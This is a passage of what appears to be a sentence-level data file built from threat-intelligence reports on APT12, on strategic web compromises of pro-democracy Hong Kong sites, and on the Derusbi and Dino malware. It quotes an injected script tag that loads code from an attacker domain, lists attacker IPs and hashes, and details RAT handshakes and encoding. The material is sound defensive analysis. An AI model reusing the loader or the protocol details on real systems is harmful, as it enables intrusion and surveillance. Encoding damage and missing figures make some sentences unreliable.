icc[.]ignorelist[.]com .", "2422": "Although there are no current infrastructure ties to link this backdoor to APT12 , there are several data points that show a possible tie to the same actors .", "2423": "Although these points do not definitively tie WATERSPOUT to APT12 , they do indicate a possible connection between the WATERSPOUT campaign , the THREEBYTE campaign , and the HIGHTIDE campaign attributed to APT12 .", "2424": "FireEye believes the change from RIPTIDE to HIGHTIDE represents a temporary tool shift to decrease malware detection while APT12 developed a completely new malware toolset .", "2425": "These development efforts may have resulted in the emergence of the WATERSPOUT backdoor .", "2426": "APT12 's adaptations to public disclosures lead FireEye to make several conclusions about this threat group .", "2427": "Though public disclosures resulted in APT12 adaptations , FireEye observed only a brief pause in APT12 activity before the threat actors returned to normal activity levels .", "2428": "Similarly , the public disclosure of APT12 's intrusion at the New York Times also led to only a brief pause in the threat group 's activity and immediate changes in TTPs .", "2429": "The pause and retooling by APT12 was covered in the Mandiant 2014 M- Trends report .", "2430": "Currently , APT12 continues to target organizations and conduct cyber operations using its new tools .", "2431": "Most recently , FireEye observed HIGHTIDE at multiple Taiwan - based organizations and the suspected APT12 WATERSPOUT backdoor at a Japan - based electronics company .", "2432": "We expect that APT12 will continue their trend and evolve and change its tactics to stay ahead of network defenders .", "2433": "Note : IOCs for this campaign can be found here .", "2434": "This entry was posted in Botnets , Targeted Attack , Threat Intelligence , Threat Research and tagged advanced malware , advanced persistent threat , advanced targeted attack , advanced threat actor , APT12 , Targeted Attack by Ned Moran , Mike Oppenheim , Sarah Engle and Richard Wartell .", "2435": "Bookmark the permalink .", "2436": "Posted on October 9 , 2014 by Steven Adair Over the last few months , Volexity has been tracking a particularly remarkable advanced persistent threat ( APT ) operation involving strategic web compromises of websites in Hong Kong and Japan .", "2437": "In both countries , the compromised websites have been particularly notable for their relevance to current events and the high profile nature of the organizations involved .", "2438": "In particular the Hong Kong compromises appear to come on the heels of the Occupy Central Campaign shifting into high gear .", "2439": "While investigating these cases , Volexity also discovered additional APT attack campaigns involving multiple other pro - democratic websites in Hong Kong .", "2440": "These attempts at exploitation , compromise , and digital surveillance are detailed throughout this post .", "2441": "Warning : Many of these websites may still be compromised and present a risk to visitors .", "2442": "Browse with caution .", "2443": "ATD is an alliance of people and organizations dedicated to democracy and universal suffrage in Hong Kong .", "2444": "At the time of this writing malicious code is still live on the website , so please visit with care until the website is clean .", "2445": "Below is a screen shot of the malicious code references found pre - pended to a JavaScript file on the website named superfish.js .", "2446": "This JavaScript file is called from other parts of the website and effectively nests the loading of additional JavaScript written and interpeted as .", "2447": "< script language = javascript src = http://java - se.com / o.js</script > The domain name java-se.com is known bad and associated with APT activity .", "2448": "At the time of this post , the domain is hosted on the Japanese IP address 210.253.101.105 .", "2449": "7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC .", "2450": "Volexity has yet to actually see the contents of the file o.js , as the websites has continuously returned HTTP 403 responses each time it was requested .", "2451": "The file was requested from IP addresses throughout Asia without ever returning valid content .", "2452": "It \u20ac \u2122s unclear if this code is activated at certain times or if there is a whitelist of IPs restricting access to the file to specific targets .", "2453": "This same code has also been observed being served from another Hong Kong website described in the next section .", "2454": "This is a fairly popular webshell that Volexity has encountered on several occasions when dealing with website compromises .", "2455": "Volexity refers to this shell as the Angel Webshell , named after its default password of \u20ac \u0153angel \u20ac \u200b.", "2456": "The shell will simply display the text \u20ac \u0153Password : \u20ac \u200b , a text input box , and a Login button .", "2457": "A screen shot of the webshell as observed on the ATD website can be seen below .", "2458": "Despite the shell being written in PHP and only displaying a simple Login prompt , it is easy to identify the Angel webshell based on unique components of its viewable HTML source code .", "2459": "The HTML source of this page is displayed in the following image .", "2460": "While Volexity operates under the assumption attackers have placed webshells on webservers they have compromised , in this particular instance it can be seen with certainty .", "2461": "In the last week , Volexity also observed both the English and Chinese language websites for the Democratic Party Hong Kong compromised with the same malicious code found ont he ATD website ( www.dphk.org | eng.dphk.org ) .", "2462": "DPHK is a pro - democracy political party in Hong Kong .", "2463": "During our research for this post , we also became aware of multiple public reports related to the compromise of the DPHK website on both Twitter and via ThreatConnect .", "2464": "Our good friend Claudio Giurianeri posted the following tweet on October 3 , 2014 The website of the Democratic Party of Hong Kong has been compromised and still is .", "2465": "Let them know .", "2466": "# OccupyCentral Diving further into some of the replies to this tweet is a plethora of information regarding the exploit domain java-se.com .", "2467": "In particular , a tweet from Brandon Dixon with relevant data from the PassiveTotal project details several subdomains and IP addresses associated with java-se.com .", "2468": "While Volexity has only observed a handful of the hostnames in the wild thus far , other active subdomains suggest there could be additional on - going exploit or malware activity from the domain .", "2469": "Additional reporting on this activity and another going back to August 2014 was also recently shared on ThreatConnect .", "2470": "Despite all of this attention , the DPHK website is still compromised and references the JavaScript from the hostile domain .", "2471": "The DPHK appears to be of high value with respect to targeting visitors .", "2472": "However , unlike the other two websites , the People Power website did not contain JavaScript modifications pointing to java- se.com .", "2473": "Instead the website appears to have malicious iFrames leveraging the Chinese URL shortener 985.so .", "2474": "At the bottom of several of the pages for the People Power website are four iFrames as seen in this screen shot of the website source .", "2475": "Those links , with the exception of the first one , all redirect to exploit pages on the Hong Kong IP address 58.64.178.77 .", "2476": "Both files are found within the Java Archives files .", "2477": "Below are details on each of the malware files .", "2478": "Filename : main.dll File size : 13824 bytes MD5 hash : 1befa2c2d1bfc8e87d52871c868f75fe SHA1 hash : 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817 Notes : 32-bit version of malware , which beacons to 58.64.178.77:443 .", "2479": "Filename : main64.dll File size : 15872 bytes MD5 hash : a482a84d13c76b950ce5bc7e75f4edef SHA1 hash : c0a4b9145e0066f5c1534beddc9c666ea8eb0882 Notes : 64-bit version of malware , which beacons to 58.64.178.77:443 .", "2480": "Volexity recommends avoiding this website and/or browsing with caution .", "2481": "Volexity believes a separate group of attackers is responsible for this exploit activity and that they are not affiliated with the java-se.com operations .", "2482": "While digging deeper into pro - democratic websites in Hong Kong , Volexity also discovered peculiar code on the website of a pro- democratic and pro - universal suffrage public policy think thank The Professional Commons ( www.procommons.org.hk ) .", "2483": "In the case of this website , there is suspicious JavaScript code that writes an iFrame pointing back to a non - existent HTML page on a hotel website in South Korea .", "2484": "The code from the website can be seen in the screen shot below .", "2485": "The URL in question points to .", "2486": "hXXp://www.hotel365.co.kr / Lnk / tw / index.html This link does not work and will redirect a visitor back to the main page of the website .", "2487": "There does not appear to be any reason for the Professional Commmons website to have a hidden iFrame link randomly placed in the middle of its HTML code .", "2488": "It is suspected that this was a formerly active exploit URL .", "2489": "If it is actually malicious , it is possible the code could be re - activated at any time .", "2490": "Volexity recommend the URL and the Professional Commons website be browsed with caution .", "2491": "In early September , the APT group behind java-se.com raised its visibility on Volexity \u20ac \u2122s radar following a compromise that effectively impacted many components of the Japanese Nikkei .", "2492": "In the first week of September , a subdomain used to load JavaScript code and additional files onto other Nikkei web properties such as www.nikkei.com and asia.nikkei.com was compromised .", "2493": "In particular a JavaScript file loaded from parts.nikkei.com was modified to reference another JavaScript file from jre76.java-se.com hosted on the Japanese IP address 211.125.81.203 .", "2494": "7506 | 211.125.80.0/22 | INTERQ | JP | GMO.JP | GMO INTERNET INC .", "2495": "The code has since been taken down .", "2496": "However , in early September the JavaScript was pre - pended to the file http://parts.nikkei.com/parts/SC/s_cDS.js as seen in the screen shot below .", "2497": "Like the JavaScript from the ATD and DPHK websites , Volexity was never actually able to obtain a live copy of this script .", "2498": "Each request results in an HTTP 403 response from the server .", "2499": "Volexity suspects the code was either active at select times and/or was only served to a subset of visitors .", "2500": "The code has not been observed on the s_cDS.js file for nearly a month now .", "2501": "While tracking this APT activity , Volexity has also come across other seemingly unrelated compromises of websites in Hong Kong and Japan associated with the java-se.com activity .", "2502": "Despite several sites being compromised , the above activity tied to java-se.com did not result in the successful capture of actual exploit code or malware .", "2503": "However , research into other websites and activity involving java-se.com did lead Volexity to live exploits and malware .", "2504": "In particular Volexity came across live exploit code hosted at jdk-7u12-windows-i586.java-se.com on the Japanese IP address 210.253.96.200 .", "2505": "7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC .", "2506": "In testing the the Java Applet pops up a notification to the user asking them if they want to run the applet .", "2507": "Volexity has not had enough time to thoroughly analyze the file to see if it is an actual exploit or if the attackers rely on user assisted malware installation .", "2508": "The pop - up does make it appear as if the file is an update to Java .", "2509": "The popup displayed by Java is displayed below .", "2510": "As can be seen in the image above , this popup could be misconstrued by a user as an update to Java despite the java-se.com domain and the Publisher being listed as WindySoft .", "2511": "Interestingly the Java Archive being loaded is digitally signed by a certificate issued to WindySoft , an online gaming company from South Korea .", "2512": "We can not confirm this certificate actually belonged to WindySoft at any point in time , however , there is fairly established precedent of certificates from online gaming companies being used to digitally sign malware and attack tools .", "2513": "As one might expect , choosing to press the Run button would be bad news for someone presented with this prompt .", "2514": "If one were to click Run from this prompt , it would result in the file css.jpg being download over an encrypted channel from a folder on https://elsa-jp.jp .", "2515": "Note that elsa-jp.jp is a website hosted on the same IP address jdk-7u12-windows-i586.java-se.com and is likely compromised .", "2516": "The file css.jpg is of course not a JPEG file , it is an executable that has been encoded with the single - byte XOR key 0xFF .", "2517": "Filename : css.jpg File size : 168776 bytes MD5 hash : b3a9e6548fb3cc511096af4d68b2e745 SHA1 hash : 394703d1240ccd3aaeeef50c212313e3036741b1 Notes : Executable file downloaded by Java Applet that has been encoded with XOR 0 -99 Taking a closer look at the resulting executable we have , it turns out it is a newer sample of PlugX.", "2518": "In this particular sample an interesting and notable string was observed .", "2519": "C:\\wocawocawoca\\piao\\Release\\caca.pdb Also of interest is that as observed from the Java Applet , the executable is also digitally signed by a certificate issued to \u20ac \u0153WindySoft .", "2520": "\u20ac \u200b Upon execution the malware sample immediately does a DNS resolution for the following hostname .", "2521": "This is very similar to the method described by FireEye in their blog on Operation Poisoned Hurricane .", "2522": "The primary difference being that the attackers opted to use a 163.com Blog over a Google Code page to embed the command .", "2523": "Taking a closer look at the Blog page the following post is observed .", "2524": "The primary string to focus on is in the title of the post : DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS Using the same decoding routine describe by Cassidian in a PlugX post of theirs from earlier this year , we can see this command decodes to instruct the malware to connect to a U.S .- based Linode IP address at Hurricane Electric : 173.255.217.77 .", "2525": "6939 | 173.255.208.0/20 | HURRICANE | US | LINODE.COM | LINODE A look at passive DNS identifies several hostnames that recently resolved to the IP address .", "2526": "The ones that still resolve to the IP are listed below .", "2527": "These hostnames may be related but at the time of this writing we have not seen them in use in malware and are unable to confirm .", "2528": "As we have seen for several years now , dissenting groups , especially those seeking increased levels of freedom frequently find themselves targeted for surveillance and information extraction .", "2529": "In the digital age , a strategic web compromise ( exploit drive - by ) has become a key weapon of choice for to conduct such operations .", "2530": "These types of attacks are far from overt , as a typical target and victim opted to go on their own to what they believe should be a safe and trusted website .", "2531": "This is not the first time and surely will not be the last time that those in favor of democracy in Hong Kong will be targeted .", "2532": "Unfortunately with the level of access and infrastructure the attackers appear to have , this is quite an uphill battle .", "2533": "Continuing to expose these attack is one means that shines light on these attack operations with an aim at putting a dent in their success .", "2534": "There are two types of Derusbi malware : a client - server model and a server - client model .", "2535": "Both types provide basic RAT functionality with the distinction between the two being largely the directionality of the communication .", "2536": "In and of itself , the Derusbi server variant is a largely unremarkable RAT when viewed from the perspective of functional capabilities .", "2537": "The server variant supports basic RAT functionality such as file management ( uploading and downloading ) , network tunneling and remote command shell .", "2538": "If a specific handshake occurs between the client and the server variant , the remainder of the communication session for the established session will be redirected to the server variant .", "2539": "If the driver does not detect the appropriate handshake , then the network traffic is allowed to pass unobstructed .", "2540": "The server variant runs as a svchost dependent service .", "2541": "While the server variant binary does have exports related to the standard service DLL ( e.g.", "2542": "ServiceMain , DllRegisterService , etc . ) , the startup sequence truly begins in the DllEntryPoint function .", "2543": "Within the main server variant function ( dubbed mainThread ) , the server variant loads a pointer to the API function GetCommandLineW , locates the pointer in memory to the command line string , and then locates the first space within the command line string and terminates the string by placing a NULL character at the location .", "2544": "If the check is unsuccessful , then the server variant terminates .", "2545": "With the command line patched and authority verified , the server variant sleeps for 5 seconds before verifying that the fShutdown flag is not set .", "2546": "The fShutdown flag can become set by the process loading the server variant calling the DllRegisterServer export .", "2547": "Therefore , by waiting 5 seconds before continuing the mainThread functionality , the server variant is giving the DllRegisterServer time to activate and perform the necessary operations to ensure that the server variant is properly installed and activated as a service .", "2548": "The mainThread calls the mainLoop function of the server variant .", "2549": "The infection ID , if present , must be decoded by XOR'ing each byte of the string with a static byte value ( typically 0x5F ) .", "2550": "If the infection ID does not exist within the registry , the server variant will attempt to load the configuration from an encoded buffer located immediately after the static string XXXXXXXXXXXXXXX , decode the buffer by starting at the last byte and XORing each previous byte by the current byte value in reverse order ; the server variant will then use a specific portion of the configuration blob as the infection ID 's base .", "2551": "Next , the server variant will append a hyphen and a four digit value to the end of the infection ID to generate the unique infection ID for the victim 's machine .", "2552": "The newly generated infection ID is then saved to the registry location stated previously .", "2553": "The mainLoop will attempt to open a handle to the driver ( if it is already installed ) by calling CreateFile with the filename of \\Device\\{93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F}.", "2554": "Failing this , the mainLoop determines if the victim 's machine is running the 360 antivirus product by looking for a process with the name ZhuDongFangYu.exe .", "2555": "If the process is running , the driver is not installed but the mainLoop continues regardless .", "2556": "If the process is not found , however , the mainLoop will extract the driver binary from an encoded buffer within itself , decode the file in memory ( using a rotating 4-byte XOR key ) , and install the driver on the victim 's machine as % SYSDIR%\\Drivers\\{93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F}.sys .", "2557": "With the driver present ( or recently installed ) , the mainLoop spawns another thread ( dubbed DerusbiThread::DerusbiThread ) that acts as the primary communication loop .", "2558": "DerusbiThread::DerusbiThread begins by generating a PCC_SOCK object .", "2559": "PCC_SOCK is an abstraction for the communication subsystem .", "2560": "The prototype for PCC_SOCK appears in Figure 1 .", "2561": "The port number is sent to the driver ( via IOCTL 0x220200 ) in order to inform the driver where to redirect incoming traffic .", "2562": "The \" Windows Device Driver ( Firewall Hook ) \" section explains the functionality of the driver in greater detail .", "2563": "At this point DerusbiThread::DerusbiThread enters an infinite loop of waiting for new connections to the listening socket and dispatching a new thread ( dubbed CommLoop ) to handle the traffic for the socket until fShutdown is set .", "2564": "At this point , the startup sequence for Derusbi is complete and the server variant moves into a communication and command dispatch phase .", "2565": "The communication between the controlling client and the Derusbi server variant depends on the device driver being in place .", "2566": "The authors of the device driver designed the driver to work on Windows 2000 and later versions of the Windows operating system .", "2567": "Depending on the version of the victim 's OS , the driver will hook the Windows Firewall by either using the surprisingly undocumented IOCTL_IP_SET_FIREWALL_HOOK command of the \\\\Device\\IP device for Windows XP or older machines or by using the documented Windows Filtering Platform ( WFP ) found in Windows Vista and later .", "2568": "Once a session has been established by means of a valid handshake , any subsequent packets from the client for the given TCP session will automatically be directed by the device driver to the Derusbi server variant .", "2569": "The device driver does not capture or store any network traffic outside of the initial handshake inspection .", "2570": "In order to establish a valid communication channel between the server variant and a controlling client , a specific handshake is required .", "2571": "The handshake between a client and the server variant is well defined and consisting of 64 bytes , the data within the handshake is entirely random with the exception of the 3rd and 8th DWORD .", "2572": "The handshake begins when the client sends a 64 byte random buffer with the 3rd ( offset 12 ) and 8th ( offset 32 ) DWORDs defined as .", "2573": "The server will acknowledge the handshake by sending a 64 byte random buffer with the same pattern for the 3rd and 8th DWORDs based on the new , randomly generated 1st DWORD ( offset 0 ) .", "2574": "It is the client 's handshake that the driver for the server variant triggers off of .", "2575": "Some older versions of the server variant use a different set of DWORDs to validate the handshake , also the tests are the same .", "2576": "These other versions have been observed to use the following DWORDs .", "2577": "If the handshake fails , the server variant provides a secondary means to authenticate a client .", "2578": "Presumably a failsafe if the driver is unable to load , the secondary method requires the client to send a POST request with the following form .", "2579": "In addition , the POST request must contain a Via field .", "2580": "If the request and the Via field exist , the server variant authenticates the client and responds with If the client 's request does not meet the appropriate authentication criteria , the server variant sends .", "2581": "With a communication channel between the server variant and the client established , the server sends information about the victim 's computer .", "2582": "Consisting of a 180 byte data structure ( Figure 3 ) , the server variant provides the client with a variety of details about the victim 's machine .", "2583": "The VictimInfoPacket has an identifier of 2 ( see the dwPktType explanation below ) .", "2584": "The communication between the server and the client at this point , and for the remainder of the session , is encrypted .", "2585": "Communication between the client and the server variant exists in the form of a sequence of encrypted datagrams .", "2586": "Each datagram consists of a 24 byte header followed by an optional payload section .", "2587": "The header is not encrypted but if the optional payload is attached , the payload is encrypted using a DWORD XOR .", "2588": "The format of the header is as follows .", "2589": "The dwTotalPacketSize field defines the total size of the datagram including both the size of the header and the size of the optional payload .", "2590": "The dwPktType field correlates to the module ID which allows the server variant to route the datagram to the appropriate module without further inspection of the payload data .", "2591": "The dwChecksum value is sum of all of the bytes within the optional header ( the field is ignored , but present , if there is no payload section ) .", "2592": "The dwEncryptionKey is the 32-bit XOR encryption key for the payload section .", "2593": "If the fCompressedPayload field is non - zero , then the data within the payload is compressed using LZO compression ( prior to XOR encoding ) and the dwDecompressedSize field represents the final size of the payload data after decompression .", "2594": "The payload section can have up to three different presentations depending on if compression is used .", "2595": "The first presentation is the original payload data as generated by the client or server , the second presentation is the LZO compressed form , and the final presentation ( the presentation that exists going across the network ) is the 32-bit XOR encoded data blob .", "2596": "Figure 4 provides a graphical representation of the presentation types of the payload section .", "2597": "The CommLoop thread begins by establishing the set of internal command handlers available to the server variant .", "2598": "With the exception of the administrative command handler ( which is built into the CommLoop ) , each of the internal commands consists of an object derived from a base object PCC_BASEMOD .", "2599": "The server variant appears to have a modular design allowing an attacker to compile only the components that are necessary for any given operation .", "2600": "The malware supports up to 8 different modules per sample with each module designating its own ID code .", "2601": "Novetta has observed the following modules .", "2602": "Given the spacing in ID numbers ( as noted in the gap between 0x82 and 0x84 in an otherwise sequential ID scheme ) , it is conceivable that additional modules exist .", "2603": "After establishing the tools , an infinite loop ( CommLoop ) is entered in which the server variant will wait for up to 1/100 of a second for input from the network ; if such input arrives , the server routes the packet to the appropriate handler .", "2604": "If the network input does not arrive , the CommLoop queries each of the command handlers for any packets they may have queued ( by calling each command handler 's ReadWaitingData function ) and transmits the packets the handlers have generated .", "2605": "Additionally , if more than 60 seconds passes between network inputs from the client or network outputs from the server variant , the CommLoop will send out a beacon packet ( dwPktType = 4 ) .", "2606": "When the appropriate command handler is found , CommLoop passes the payload of portion of the packet to the command handler 's ProcessPacket function .", "2607": "The PCC_CMD object contains the remote shell functionality of the server variant along with the ability to execute arbitrary programs .", "2608": "Derived from the PCC_BASEMOD class , the PCC_CMD class 's operations are focused largely in the ProcessPacket and ReadWaitingData functions .", "2609": "The PCC_CMD::ProcessPacket function works as a stub function that merely passes the packet 's payload data ( pkt ) data to PCC_CMD::ProcessPacketEx while ignoring the dwPktSize parameter .", "2610": "The packet 's payload data is , in and of itself , another datagram with a header and optional payload section .", "2611": "The payload of each PCC_CMD destined packet contains the following header .", "2612": "The dwCommandType field specifies the specific PCC_CMD command that the client is requesting the server variant perform .", "2613": "There are four commands that PCC_CMD supports .", "2614": "For each of the commands , any output from or acknowledgement of the commands comes in the form of another packet consisting of a PacketHeader followed by a PCCCMDPacketHeader and any optional payload data .", "2615": "The dwCommandType of the newly constructed packet matches the command 's original dwCommandType value ( e.g.", "2616": "responses from 0x04 commands will reply with dwCommandType set to 0x04 ) .", "2617": "PCC_CMD::ProcessPacketEx will queue the response packets in an internal buffer .", "2618": "The PCC_CMD::ReadWaitingData member function is responsible for transmitting any of the previously queued packets from PCC_CMD::ProcessPacketEx .", "2619": "If there are no queued packets , PCC_CMD::ReadWaitingData will perform a queue of the console output pipe for the remote shell process ( if it is active ) ; the function will also attempt to read the entirety of the waiting data , which then becomes the payload of a PacketHeader / PCCCMDPacketHeader based packet with the dwCommandType set to 0x0C.", "2620": "If the read is unsuccessful , the function returns a PacketHeader / PCCCMDPacketHeader based packet with the dwCommandType set to 0x10 indicating an error and terminating the remote shell session .", "2621": "The PCC_FILE object provides a large range of file system administration functions .", "2622": "PCC_FILE is derived from the PCC_BASEMOD class meaning that the processing of commands should be contained within the PCC_FILE::ProcessPacket member function with some additional processing done in the PCC_FILE::ReadWaitingData member function .", "2623": "This is not necessarily the case , however .", "2624": "The PCC_FILE::ProcessPacket member function , much like PCC_CMD::ProcessPacket , is little more than a stub function that passes only a copy of the payload data ( pkt ) to PCC_FILE::ProcessPacketEx .", "2625": "PCC_FILE::ProcessPacketEx performs no file management operations but instead adds any incoming command packets to a queue for processing by PCC_FILE::ReadWaitingData if the packet is not already within the queue ( thus avoiding duplication of commands ) .", "2626": "The PCC_FILE::ReadWaitingData member function is a stub function that calls PCC_FILE::ProcessQueue and returns the resulting packet from the queue processing .", "2627": "This means that file operations are surprisingly low priority , and potentially , high latency operations .", "2628": "Each packet that arrives within the packet queue of PCC_FILE contains a standard header followed by a ( quasi - optional ) payload data blob .", "2629": "The header for the PCC_FILE command packets takes the following form .", "2630": "The dwCommandType field specifies the specific PCC_FILE command that the client is requesting the server variant to perform .", "2631": "PCC_FILE supports 17 ( of which 15 are unique ) commands .", "2632": "While the general form within the Derusbi server variant communication model is to return a packet with the same dwCommandType as the original command , many of the PCC_FILE commands return a status packet type ( dwCommandType = 0x04 ) .", "2633": "Commands 0x2C , 0x44 , and 0x48 all appear to be the exact same base command with only slight variations in their response format .", "2634": "It is unclear why this particular command is included three times in PCC_FILE .", "2635": "The PCC_PROXY object provides the platform for a tunneling network traffic to and from the client to a specific endpoint ( or endpoints if multiple tunnels are activated by the client ) .", "2636": "Derived on the PCC_BASEMOD class , the PCC_PROXY class performs very little network tunneling within the CommLoop interactive PCC_PROXY::ProcessPacket and PCC_PROXY::ReadWaitingData member functions .", "2637": "The PCC_PROXY::ProcessPacket member function queues incoming PCC_PROXY packets into a received queue while PCC_PROXY::ReadWaitingData returns packets from a transmit queue , with the directionality from the perspective of the server variant .", "2638": "The core of the PCC_PROXY 's network tunneling comes from a spawned processing thread ( PCC_PROXY::MainThread ) that is generated when the PCC_PROXY object is instantiated .", "2639": "The PCC_PROXY::MainThread function consist an infinite loop that only terminates when the PCC_PROXY::fShutdown flag is set .", "2640": "Otherwise , the loop will inspect another internal flag ( PCC_PROXY::fNetworkEnabled ) to determine if the network tunneling is currently active .", "2641": "If the PCC_PROXY::fNetworkEnabled flag is set to false , then tunneling is disabled but command processing continues .", "2642": "It is possible to have more than one tunnel active at any given time .", "2643": "In order to firewall tunnels from each other over the backbone of the server variant 's command channel , each tunnel is assigned a specific channel identifier .", "2644": "This allows the client to specify which specific tunnel data is transmitted to as well as telling the client which tunnel is returning data .", "2645": "If the PCC_PROXY::fNetworkEnabled flag is set to true , PRC_PROXY::MainThread will loop through all active channels , perform a select on the socket connected to the endpoint and -- if the select indicates that there is data waiting on a particular socket -- the data is read .", "2646": "A new PCC_PROXY based packet is then generated and the packet is queued for delivery to the client .", "2647": "After processing each of the channels for new data , PCC_PROXY::MainThread processes incoming command packets from the client ( an operation usually handled by the PCC_BASEMOD::ProcessPacket function ) .", "2648": "Packets belonging to the PCC_PROXY subsystem have a common header , much like the other PCC_BASEMOD derived classes .", "2649": "To this end , the PCC_PROXY packets have the same packet header as the PCCFilePacketHeader packet header .", "2650": "The PCC_PROXY supports five commands .", "2651": "The administrative commands are built - in to the server variant and are not derived from the PCC_BASEMOD class .", "2652": "Each of the administrative command packets contains the same header structure as the PCCFilePacketHeader structure followed by an optional payload data blob .", "2653": "The administrative commands consist of the following five commands .", "2654": "Given the encrypted , and potentially compressed , nature of Derusbi server variant network traffic , detecting the traffic on a network can be problematic using traditional IDS signatures .", "2655": "Using a heuristic approach , it would be possible to detect the handshake of a possible Derusbi server variant session by looking for the following pattern .", "2656": "Detecting Derusbi server variants on disk is possible using the following YARA signature .", "2657": "Security news , views and insight from the ESET experts BY JOAN CALVET POSTED 30 JUN 2015 11:12AM In this blog we describe a sophisticated backdoor , called Dino by its creators .", "2658": "We believe this malicious software has been developed by the Animal Farm espionage group , who also created the infamous Casper , Bunny and Babar malware .", "2659": "Dino contains interesting technical features , and also a few hints that the developers are French speaking .", "2660": "Animal Farm is the security industry 's name for a group of attackers first described by Canada 's Communications Security Establishment ( CSE ) in a set of slides leaked by Edward Snowden in March 2014 .", "2661": "In those slides CSE assess with \" moderate certainty \" that this group is a French intelligence agency .", "2662": "Since then , several examples of malware created by Animal Farm have been found and publicly documented , in particular .", "2663": "Casper , a stealthy first stage implant , documented by ESET in last March Bunny , a Lua based backdoor , documented by Marion Marschalek ( Cyphort ) Babar , an espionage platform , also analyzed by Marion Marschalek The connection between those pieces of malware and the group described in CSE slides has been convincingly established , for example by Paul Rascagn res ( G Data ) .", "2664": "In this blog post we add a new piece to the puzzle with Dino , another malicious program belonging to Animal Farm 's arsenal .", "2665": "The sample of Dino documented in this blog post was used in 2013 against targets in Iran .", "2666": "The original means of infection is unknown , though we believe Dino was installed by another program , as it contains an uninstallation command without the corresponding installation procedure .", "2667": "The binary 's original name , \" Dino.exe \" , has been left visible by its authors , as was the case with Casper .", "2668": "Dino \u2013 which could be referring to the pet character from The Flintstones cartoon show \u2013 was already mentioned in a recent Kaspersky blog as a \" full featured espionage platform , \" but no technical analysis has been published yet .", "2669": "Interestingly , the binary contains a lot of verbose error messages , allowing us to see Dino 's developers ' choice of wording .", "2670": "Also , a few technical artefacts suggest that Dino was authored by native French speakers .", "2671": "Dino has been developed in C++ and presents a well defined modular architecture .", "2672": "The following array lists the modules contained in this Dino binary\u037e the module names are those assigned by the developers .", "2673": "Dino heavily relies on a custom data structure named \" DataStore \" by the Animal Farm developers .", "2674": "In particular , all Dino 's modules store their content inside this structure , making its understanding one of the keys to analyzing Dino .", "2675": "A DataStore is a map from string keys to values of 8 possible types , such as integers or strings .", "2676": "The implementation of this data structure is based on a hash table .", "2677": "It means that to retrieve the value associated with a key , one has to calculate the hash of the key to locate a bucket from which the value can be retrieved .", "2678": "Dino 's hash is a one byte value calculated with a series of XOR operations on the key , and each bucket starts a linked list containing key / value pairs .", "2679": "The code responsible for retrieving the value associated with a key is shown in Figure 1 .", "2680": "Finally , DataStore objects can be serialized in a custom format , which begins with the magic word \" DxSx \" .", "2681": "More precisely , when a modification is made to a module 's content in memory , the PSM module saves it as a serialized DataStore .", "2682": "When Dino restarts , the module is deserialized from the file and loaded into memory .", "2683": "Funnily enough , the key serving to encrypt the file on disk is \" PsmIsANiceM0du1eWith0SugarInside \" .", "2684": "Dino 's configuration is initially stored in a serialized DataStore object contained in a zip archive at the end of the Dino binary .", "2685": "At runtime this object is deserialized and stored inside the CORE module .", "2686": "We can list the configuration 's content with Dino 's \" conf \u2013l CORE \" command \u2013 described later \u2013 which displays on separate rows each key 's name , its associated value and the type of this value .", "2687": "\" recID \" : Animal Farms binaries contain an ID whose decimal value appears to identify the target , \" 11173 01 PRS \" in this case .", "2688": "For example Casper used an \" ID \" value set to \" 13001 \" , whereas some Babar samples used \" 12075 01 \" and \" 11162 01 \" .", "2689": "We do not know the meaning of the \" PRS \" suffix added in the case of Dino .", "2690": "All the URLs were down when we started our analysis .", "2691": "Those C&Cs were compromised legitimate websites , which is standard operating procedure for Animal Farm .", "2692": "\" Version \" : Dino 's code version\u037e here set to \" 1.2 \" , which is confirmed by the \" din12 \" folder used in one of the C&C URLs .", "2693": "For the record , a \" d13 \" folder has been seen on another Animal Farm C&C ( see \" 3.7 Calling home \" of Marschalek 's Babar report ) , indicating that Dino version 1.3 has also likely been deployed at some point .", "2694": "Their values start with the word \" MAGICBOX \" .", "2695": "The three last keys are displayed with obfuscated names ( \" xT0rvwz \" , \" tr4qa589 \" and \" jopcft4 T \" ) and store parameters for the custom file system we will describe later .", "2696": "The following Table lists the commands accepted by this Dino binary with the names chosen by the developers .", "2697": "Each of those commands can take one or more arguments .", "2698": "For example , it can provide all files with a \" .doc \" extension , the size of which is bigger than 10 kilobytes , and that were modified in the last 3 days .", "2699": "We believe this exfiltration of files to be Dino 's end goal .", "2700": "At startup Dino executes successively the commands stored in the \" InitialCommands \" field in its configuration\u037e in the sample we analyzed they are .", "2701": "Those commands serve as a reconnaissance step for the operators .", "2702": "Their execution is managed by the CMDEXEC module , the commands being stored in a queue inside the CMDEXECQ module .", "2703": "After having described Dino 's basics , we are now going to dig into two particularly interesting components\u037e first , a custom file system used by the malware , and then the CRONTAB module in charge of task scheduling .", "2704": "RamFS also comes with a set of custom commands that can be stored in files and executed .", "2705": "It should be noticed that ramFS is also present in other Animal Farm binaries ( see attribution paragraph below ) , but since we are unaware of previous analysis of ramFS , we are describing our findings here .", "2706": "RamFS content is initially stored encrypted in Dino 's configuration under the key \" xT0rvwz \" , whereas the corresponding RC4 key is stored under the key \" tr4qa589 \" .", "2707": "Once the file system has been decrypted , it is stored in memory as a linked list of 512 byte memory chunks , each one of them being individually RC4 encrypted .", "2708": "When looking for a file in ramFS , each chunk is decrypted , processed and then re encrypted .", "2709": "Hence there are very few noticeable traces of ramFS during its use .", "2710": "Here are some high level characteristics of this file system .", "2711": "The developers named this file the \" cleaner \" and it is executed when Dino receives the command \" killBD \" ( the \" BD \" acronym is the developers ' designation of the malware ) .", "2712": "Figure 2 shows the code responsible for executing this cleaner file .", "2713": "First , it retrieves the name of the file from Dino 's configuration ( \" a.ini \" ) , then it retrieves the key to decrypt ramFS , and it finally mounts the file system in memory in order to execute the cleaner file stored inside .", "2714": "The verbosity of the error messages makes it particularly easy to understand the purpose of the code .", "2715": "Those tasks are Dino 's commands .", "2716": "The syntax to define scheduled tasks is similar to the one used by the cron Unix command .", "2717": "In particular the time at which to run a command is given by a string following the format \" minute hour day month year dayofweek \" .", "2718": "Alternatively , this string can be replaced by \" @boot \" for a command to run at each startup \u2013 whereas some Unix cron 